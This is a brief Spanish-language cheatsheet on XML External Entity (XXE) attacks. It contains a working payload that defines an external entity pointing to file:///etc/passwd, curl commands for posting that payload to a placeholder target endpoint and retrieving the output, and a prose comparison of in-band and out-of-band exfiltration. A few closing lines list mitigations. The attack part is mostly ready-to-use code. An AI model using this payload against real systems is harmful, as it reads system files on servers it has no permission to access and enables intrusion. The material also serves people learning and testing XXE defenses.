# XXE (XML External Entity) Cheatsheet

## Payload básico (file://)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

## XXE In-Band vs OOB
- **In-Band:** El contenido del archivo se devuelve en la respuesta HTTP
- **OOB (Out-of-Band):** El contenido se envía a un servidor externo (requiere red de salida)

## Extraer archivo mediante XXE in-band
```bash
# 1. Enviar payload XXE
curl -s -X POST http://<target>/endpoint \
  -H 'Content-Type: application/xml' \
  --data-binary @xxe.xml

# 2. Recuperar contenido (según la aplicación)
curl -s "http://<target>/endpoint?query=..."
```

## Mitigación
- Deshabilitar resolución de entidades externas
- Usar parsers XML seguros (defusedxml en Python)
- Validar entrada XML